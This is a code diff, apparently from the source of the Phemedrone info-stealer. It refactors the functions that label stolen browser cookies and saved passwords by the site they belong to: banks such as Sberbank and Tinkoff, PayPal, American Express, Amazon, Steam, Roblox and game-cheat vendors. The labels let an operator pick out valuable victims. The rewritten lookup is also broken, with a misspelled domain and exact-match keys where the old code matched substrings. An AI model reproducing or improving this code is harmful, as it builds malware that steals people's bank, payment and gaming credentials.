@@ -115,66 +115,43 @@ namespace Phemedrone.Extensions
             return browserLocations;
         }
 
+        private static Dictionary<string, string> _tags = new() // you cann add tag example: {"domain", "TAG IN LOG"}
+        {
+            {"robloc.com", "ROBLOX"},
+            {"steampowered.com", "GAMES"},
+            {"genshin", "GAMES"},
+            {"epicgames.com", "GAMES"},
+            {"qiwi", "BANK"},
+            {"tinkoff", "BANK"},
+            {"yoomoney", "BANK"},
+            {"sberbank", "BANK"},
+            {"funpay", "MONEY"},
+            {"paypal", "MONEY"},
+            {"americanexpress", "MONEY"},
+            {"amazon", "MONEY"},
+            {"spotify", "MUSIC"},
+            {"music.apple", "MUSIC"},
+            {"celka.", "CHEATS"},
+            {"nursultan.", "CHEATS"},
+            {"xone", "CHEATS"},
+            {"akrien", "CHEATS"},
+            {"interium", "CHEATS"},
+            {"nixware", "CHEATS"},
+            {"expensive.", "CHEATS"},
+            {"gamesense", "CHEATS"},
+            {"neverlose", "CHEATS"},
+            {"youtube", "YOUTUBE"},
+            {"minecraft.net", "GAMES"}
+        };
         public static void CookiesTags(string url)
         {
-            if (url.Contains("roblox.com") || url.Contains("steampowered.com") || url.Contains("genshin") || url.Contains("epicgames.com") || url.Contains("fortnite.com"))
-            {
-                ServiceCounter.cookiestags.Add("GAMES");
-            }
-
-            if (url.Contains("qiwi") || url.Contains("tinkoff") || url.Contains("yoomoney") || url.Contains("sberbank"))
-            {
-                ServiceCounter.cookiestags.Add("BANK");
-            }
-            if (url.Contains("facebook"))
-            {
-                ServiceCounter.cookiestags.Add("FACEBOOK");
-            }
-            if (url.Contains("funpay") || url.Contains("paypal") || url.Contains("americanexpress") || url.Contains("amazon"))
-            {
-                ServiceCounter.cookiestags.Add("MONEY");
-            }
-            if (url.Contains("spotify") || url.Contains("music.apple"))
-            {
-                ServiceCounter.cookiestags.Add("MUSIC");
-            }
-            
-            if (url.Contains("deadcode") || url.Contains("celka") || url.Contains("nursultan") || url.Contains("akrien") || url.Contains("expenisve") || url.Contains("wexside") || url.Contains("x.synapse") || url.Contains("synapse") || url.Contains("neverlose") || url.Contains("gamesense") || url.Contains("nixware") || url.Contains("primordial") || url.Contains("interium") || url.Contains("xone"))
-            {
-                ServiceCounter.cookiestags.Add("CHEATS");
-            }
+            if (_tags.TryGetValue(url, out var tag))
+                ServiceCounter.cookiestags.Add(tag);
         }
         public static void PasswordsTags(string url)
         {
-            if (url.Contains("roblox.com") || url.Contains("steampowered.com") || url.Contains("genshin") || url.Contains("epicgames.com") || url.Contains("fortnite.com"))
-            {
-                ServiceCounter.passwordstags.Add("GAMES");
-            }
-
-            if (url.Contains("qiwi") || url.Contains("tinkoff") || url.Contains("yoomoney") || url.Contains("sberbank"))
-            {
-                ServiceCounter.passwordstags.Add("BANK");
-            }
-
-            if (url.Contains("facebook"))
-            {
-                ServiceCounter.passwordstags.Add("FACEBOOK");
-            }
-
-            if (url.Contains("funpay") || url.Contains("paypal") || url.Contains("americanexpress") || url.Contains("amazon"))
-            {
-                ServiceCounter.passwordstags.Add("MONEY");
-            }
-
-            if (url.Contains("spotify") || url.Contains("music.apple"))
-            {
-                ServiceCounter.passwordstags.Add("MUSIC");
-            }
-
-            if (url.Contains("deadcode") || url.Contains("celka") || url.Contains("nursultan") || url.Contains("akrien") || url.Contains("expenisve") || url.Contains("wexside") || url.Contains("x.synapse") || url.Contains("synapse") || url.Contains("neverlose") || url.Contains("gamesense") || url.Contains("nixware") || url.Contains("primordial") || url.Contains("interium") || url.Contains("xone"))
-            {
-                ServiceCounter.passwordstags.Add("CHEATS");
-            }
+            if (_tags.TryGetValue(url, out var tag))
+                ServiceCounter.passwordstags.Add(tag);
         }
     }
 }
